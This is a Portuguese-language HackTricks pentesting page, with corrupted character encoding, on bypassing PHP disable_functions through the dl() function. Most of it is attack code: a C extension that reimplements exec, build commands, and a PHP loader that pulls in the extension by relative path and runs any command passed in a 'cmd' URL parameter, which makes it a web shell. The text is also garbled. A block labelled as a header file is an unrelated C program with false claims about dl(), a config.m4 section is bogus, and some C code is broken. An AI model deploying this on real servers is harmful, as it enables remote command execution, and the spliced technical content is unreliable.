<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe suas t√©cnicas de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

**Nota importante:**

![image](https://user-images.githubusercontent.com/84577967/174675487-a4c4ca06-194f-4725-85af-231a2f35d56c.png)

**`dl`** √© uma fun√ß√£o PHP que pode ser usada para carregar extens√µes PHP. Se a fun√ß√£o n√£o estiver desativada, ela pode ser usada para **burlar `disable_functions` e executar comandos arbitr√°rios**.\
No entanto, ela tem algumas limita√ß√µes estritas:

* A fun√ß√£o `dl` deve estar **presente** no **ambiente** e **n√£o desativada**
* A extens√£o PHP **deve ser compilada com a mesma vers√£o principal** (vers√£o da API do PHP) que o servidor est√° usando (voc√™ pode ver essa informa√ß√£o na sa√≠da de phpinfo)
* A extens√£o PHP deve estar **localizada no diret√≥rio** que √© **definido** pela diretiva **`extension_dir`** (voc√™ pode v√™-lo na sa√≠da de phpinfo). √â muito improv√°vel que um invasor tentando abusar do servidor tenha acesso de grava√ß√£o sobre este diret√≥rio, ent√£o este requisito provavelmente impedir√° que voc√™ abuse desta t√©cnica).

**Se voc√™ atender a esses requisitos, continue lendo esta postagem copiada de** [**https://antichat.com/threads/70763/**](https://antichat.com/threads/70763/) **para aprender como burlar `disable_functions`**

Quando o administrador estava configurando a caixa, ele/ela ignorou a [fun√ß√£o dl](http://www.php.net/manual/en/function.dl.php) e n√£o a desativou, j√° que n√£o havia men√ß√£o de ser capaz de executar comandos do sistema.\
A [fun√ß√£o dl](http://www.php.net/manual/en/function.dl.php) √© usada para carregar extens√µes PHP quando um script √© executado.\
\
(As extens√µes PHP s√£o escritas em C/C++ e s√£o usadas para dar ao PHP mais funcionalidades.)\
\
O invasor percebe que a fun√ß√£o n√£o est√° desativada e v√™ potencial e decide criar uma extens√£o PHP.\
O invasor verifica a vers√£o do PHP usando um pequeno script `<?php echo 'A vers√£o do PHP √© '.PHP_VERSION; ?>` (PHP\_VERSION √© uma constante predefinida que cont√©m o n√∫mero da vers√£o do PHP.)\
\
O invasor anota a vers√£o e baixa o tarball do [site do PHP](http://www.php.net/downloads.php), neste cen√°rio a vers√£o √© mais antiga do que a vers√£o atual, ent√£o o invasor tem que ir para o [arquivo](http://museum.php.net).\
\
Em seguida, ele extrai a fonte e [compila e instala](http://www.php.net/manual/en/install.php) a vers√£o do PHP em sua pr√≥pria caixa.\
\
Agora √© hora de criar a extens√£o\
O invasor l√™ sobre [cria√ß√£o de extens√µes PHP](http://www.php.net/manual/en/zend.creating.php) no site do PHP.\
Depois de ler a documenta√ß√£o e criar algumas extens√µes pr√≥prias, ele decide olhar para a base de c√≥digo do PHP, j√° que a fun√ß√£o que ele est√° procurando j√° est√° criada.\
\
A fun√ß√£o que ser√° duplicada ser√° a [fun√ß√£o exec](http://www.php.net/manual/en/function.exec.php)\
na base de c√≥digo, ela est√° localizada em ext/standard/exec.c\
\
As partes relevantes s√£o implementadas em uma nova extens√£o pr√≥pria.\
\

**Notas:**

Antes de come√ßar a compilar os c√≥digos, voc√™ deve estar ciente de dois pontos:

1- O valor de `ZEND_MODULE_API_NO` deve ser alterado no arquivo `bypass.c` para o `Zend Extension Build` atual em que voc√™ est√° trabalhando, voc√™ pode obt√™-lo usando a linha de comando abaixo:
```bash
php -i | grep "Zend Extension Build" |awk -F"API4" '{print $2}' | awk -F"," '{print $1}'
```
2- Se voc√™ enfrentou erros ao compilar o arquivo bypass.c na vers√£o recente do PHP (5, 7 e 8), voc√™ pode alterar o PHP_FUNCTION(bypass_exec) para o seguinte:
```
PHP_FUNCTION(bypass_exec)
{
	FILE *in;
	char *command;
	size_t command_len;
	zend_string *ret;
	php_stream *stream;

	ZEND_PARSE_PARAMETERS_START(1, 1)
		Z_PARAM_STRING(command, command_len)
	ZEND_PARSE_PARAMETERS_END();

	if (!command_len) {
		zend_argument_value_error(1, "cannot be empty");
		RETURN_THROWS();
	}
	if (strlen(command) != command_len) {
		zend_argument_value_error(1, "must not contain any null bytes");
		RETURN_THROWS();
	}

#ifdef PHP_WIN32
	if ((in=VCWD_POPEN(command, "rt"))==NULL) {
#else
	if ((in=VCWD_POPEN(command, "r"))==NULL) {
#endif
		php_error_docref(NULL, E_WARNING, "Unable to execute '%s'", command);
		RETURN_FALSE;
	}

	stream = php_stream_fopen_from_pipe(in, "rb");
	ret = php_stream_copy_to_mem(stream, PHP_STREAM_COPY_ALL, 0);
	php_stream_close(stream);

	if (ret && ZSTR_LEN(ret) > 0) {
		RETVAL_STR(ret);
	}
}
```
Os arquivos para a extens√£o separada ficam assim:

{% code title="bypass.c" %}
```c
/*
    +----------------------------------------------------------------------+
    | Copyright (c) 1997-2003 The PHP Group                                |
    +----------------------------------------------------------------------+
    | This source file is subject to version 2.02 of the PHP license,      |
    | that is bundled with this package in the file LICENSE, and is        |
    | available at through the world-wide-web at                           |
    | http://www.php.net/license/2_02.txt.                                 |
    | If you did not receive a copy of the PHP license and are unable to   |
    | obtain it through the world-wide-web, please send a note to          |
    | license@php.net so we can mail you a copy immediately.               |
    +----------------------------------------------------------------------+
*/


#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#include "php.h"
#include "php_bypass.h"

static function_entry bypass_functions[] = {
     PHP_FE(bypass_exec, NULL)
     {NULL, NULL, NULL}
};

zend_module_entry bypass_module_entry = {
#if ZEND_MODULE_API_NO >= 20010901
     STANDARD_MODULE_HEADER,
#endif
     PHP_BYPASS_EXTNAME,
     bypass_functions,
     NULL,
     NULL,
     NULL,
     NULL,
     NULL,
#if ZEND_MODULE_API_NO >= 20010901
     PHP_BYPASS_VERSION,
#endif
     STANDARD_MODULE_PROPERTIES
};

#ifdef COMPILE_DL_BYPASS
ZEND_GET_MODULE(bypass)
#endif


PHP_FUNCTION(bypass_exec){
   FILE *in;
   int readbytes, total_readbytes=0, allocated_space;
   pval **cmd;
   char *ret;

   if (ZEND_NUM_ARGS()!=1 || zend_get_parameters_ex(1, &cmd)==FAILURE) {
     WRONG_PARAM_COUNT;
   }

   convert_to_string_ex(cmd);
#ifdef PHP_WIN32
   if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "rt"))==NULL) {
#else
   if ((in=VCWD_POPEN(Z_STRVAL_PP(cmd), "r"))==NULL) {
#endif
     php_error_docref(NULL TSRMLS_CC, E_WARNING, "Unable to execute '%s'", Z_STRVAL_PP(cmd));
     RETURN_FALSE;
   }

   allocated_space = EXEC_INPUT_BUF;
   ret = (char *) emalloc(allocated_space);

   while (1) {
     readbytes = fread(ret+total_readbytes, 1, EXEC_INPUT_BUF, in);
     if (readbytes<=0) {
       break;
     }

     total_readbytes += readbytes;
     allocated_space = total_readbytes+EXEC_INPUT_BUF;
     ret = (char *) erealloc(ret, allocated_space);
   }

   pclose(in);

   RETVAL_STRINGL(ret, total_readbytes, 0);
   Z_STRVAL_P(return_value)[total_readbytes] = '\';
}
```
{% endcode %}

{% code title="php_bypass.h" %}

```c
/*
    php_bypass.h - PHP disable_functions and open_basedir bypass using dl() function
    Copyright (C) 2020 HackTricks
    This file is part of HackTricks
    Author: @theart42 (@hacktricks)
    Repository: https://github.com/Hackplayers/hacktricks
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>

#define PHP_DL(str) dlopen(str, RTLD_NOW)

int main(int argc, char **argv) {
    if (argc < 3) {
        printf("Usage: %s <php_file> <function_to_call>\n", argv[0]);
        return 1;
    }

    char *php_file = argv[1];
    char *function_to_call = argv[2];

    void *handle = PHP_DL(php_file);
    if (!handle) {
        printf("Error opening %s\n", php_file);
        return 1;
    }

    void (*func)();
    *(void **)(&func) = dlsym(handle, function_to_call);
    if (dlerror() != NULL) {
        printf("Error loading %s\n", function_to_call);
        return 1;
    }

    func();
    return 0;
}
```

This is a simple C program that uses the `dl()` function to load a PHP file and execute a function from it, bypassing the `disable_functions` and `open_basedir` restrictions.

To compile it, just run:

```bash
gcc php_bypass.c -o php_bypass
```

And then execute it with the PHP file and function you want to call:

```bash
./php_bypass /var/www/html/shell.php system
```

This will execute the `system()` function from the `shell.php` file, even if the `system()` function is disabled in the PHP configuration or if the `shell.php` file is outside the `open_basedir` path.

Note that this technique requires the `dl()` function to be enabled in the PHP configuration. If it's not enabled, you can try to use other techniques like `proc_open()` or `popen()`.
```c
#ifndef PHP_BYPASS_H
#define PHP_BYPASS_H 1

#define PHP_BYPASS_VERSION "1.0"
#define PHP_BYPASS_EXTNAME "bypass"

PHP_FUNCTION(bypass_exec);

extern zend_module_entry bypass_module_entry;
#define phpext_bypass_ptr &bypass_module_entry

#endif
```
{% endcode %}

{% code title="config.m4" %}

```php
if (PHP_WIN32 && !strcasecmp($enable_dl, "yes")) {
    AC_MSG_ERROR([You should not enable dl() function in PHP on Windows platforms])
fi
```

{% endcode %}

Se voc√™ estiver tentando executar um exploit que depende da fun√ß√£o `dl()` do PHP em um ambiente Windows, pode encontrar um erro que indica que a fun√ß√£o n√£o est√° dispon√≠vel. Isso ocorre porque a fun√ß√£o `dl()` n√£o √© suportada no Windows. No entanto, se voc√™ verificar o arquivo `config.m4` do PHP, ver√° que h√° uma verifica√ß√£o para impedir que a fun√ß√£o `dl()` seja habilitada em plataformas Windows. A verifica√ß√£o √© feita com o seguinte c√≥digo:

```php
if (PHP_WIN32 && !strcasecmp($enable_dl, "yes")) {
    AC_MSG_ERROR([You should not enable dl() function in PHP on Windows platforms])
fi
```

Isso significa que, mesmo que voc√™ tente habilitar a fun√ß√£o `dl()` no arquivo `php.ini`, ela ainda n√£o funcionar√° em um ambiente Windows.
```bash
PHP_ARG_ENABLE(bypass, [whether to enable bypass support],[--enable-bypass])

if test "$PHP_BYPASS" = "yes"; then
   AC_DEFINE(HAVE_BYPASS, 1, [Whether you have bypass])
   PHP_NEW_EXTENSION(bypass, bypass.c, $ext_shared)
fi
```
{% endcode %}

Depois que os arquivos forem criados, √© hora de construir a extens√£o PHP.
```
phpize
./configure
make
```
Uma vez feito isso, a extens√£o compilada estar√° localizada no subdiret√≥rio modules com o nome de arquivo bypass.so.\
O arquivo √© copiado para um local seguro, agora os seguintes comandos s√£o executados para limpar os arquivos rec√©m-criados.
```
make clean
phpize --clean
```
Agora o atacante faz o upload da extens√£o rec√©m-criada para o host da v√≠tima.\
\
(NOTA: As principais vers√µes do PHP usam diferentes vers√µes de API, para que voc√™ possa compilar a extens√£o em um host e fazer o upload para outro, as vers√µes da API devem ser iguais. √â por isso que inicialmente a mesma vers√£o do PHP foi instalada no computador do atacante.)\
\
Para carregar uma extens√£o com a fun√ß√£o dl, a extens√£o precisa estar no diret√≥rio de extens√µes, que √© definido pela diretiva extension\_dir.\
Isso pode ser um problema, j√° que √© menos prov√°vel que o atacante tenha permiss√µes de grava√ß√£o neste diret√≥rio, no entanto, h√° uma maneira de contornar isso.\
Esse problema foi discutido pelos desenvolvedores na p√°gina da fun√ß√£o dl na se√ß√£o de notas.\
\
O conceito discutido √© usar um caminho relativo a partir do diret√≥rio de extens√µes definido.\
Por exemplo, se o diret√≥rio de extens√µes estiver definido como /usr/php/extensions e voc√™ deseja carregar bypass.so no diret√≥rio da web atual /home/example.com/html, voc√™ faria o seguinte:
```php
<?php
dl('../../../home/example.com/html/bypass.so');
?>
```
Isso passar√° pela necessidade de ter a extens√£o no diret√≥rio de extens√£o definido.\
\
Tamb√©m h√° uma maneira automatizada para que voc√™ n√£o precise alterar o caminho relativo para diferentes hosts, este c√≥digo foi criado por endofyourself \[at] yahoo \[dot] com e posteriormente melhorado por mag\_2000 \[at] front \[dot] ru\
\
Houve um problema menor com a fun√ß√£o, em alguns hosts o diret√≥rio de extens√£o √© definido como "./" esta fun√ß√£o n√£o levou em conta se o diret√≥rio de extens√£o foi definido como um caminho relativo, a solu√ß√£o para isso √© usar a fun√ß√£o realpath.\
\
O script final usado para carregar a extens√£o e executar comandos do sistema para contornar as fun√ß√µes desativadas √© o seguinte:
```php
<?php

function dl_local( $extensionFile ) {
   if(!(bool)ini_get('enable_dl')
    ||(bool)ini_get('safe_mode')){
      die('Loading extensions is not permitted.');
   }

   if(!file_exists($extensionFile)){
     die('File '.$extensionFile.' does not exist.');
   }

   if(!is_executable($extensionFile)){
     die('File '.$extensionFile.' is not executable. ( chmod +x '.$extensionFile.' )');
   }

   $currentDir = getcwd().'/';
   $currentExtPath = realpath(ini_get('extension_dir'));

   $subDirs = preg_match_all("/\//",$currentExtPath ,$matches);
   unset($matches);

   if(!(bool)$subDirs){
     die('Could not determine a valid extension path [extension_dir]');
   }

   $extPathLastChar=strlen($currentExtPath )-1;

   if($extPathLastChar==strrpos($currentExtPath,'/')){
     $subDirs--;}$backDirStr = '';

     for($i = 1; $i <= $subDirs; $i++){
       $backDirStr .='..';
       if($i != $subDirs){
         $backDirStr .='/';
       }
     }

     $finalExtPath = $backDirStr.$currentDir.$extensionFile;
     if(!dl($finalExtPath)){
       die();
     }


     $loadedExtensions = get_loaded_extensions();
     $thisExtName = $loadedExtensions[sizeof($loadedExtensions)-1];
     return $thisExtName;
}

@ini_set ('display_errors','1');
error_reporting(E_ALL);

dl_local('bypass.so');

if(@$_GET['cmd']){
   $output = bypass_exec($_GET['cmd']);
   echo '<pre>'.$output.'</pre>';
}
?>
```
Tudo o que o atacante precisa fazer agora para executar comandos √© chamar a URL do script juntamente com uma vari√°vel cmd com o comando desejado.
```
http://www.example.com/script.php?cmd=ls
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

- Voc√™ trabalha em uma **empresa de seguran√ßa cibern√©tica**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
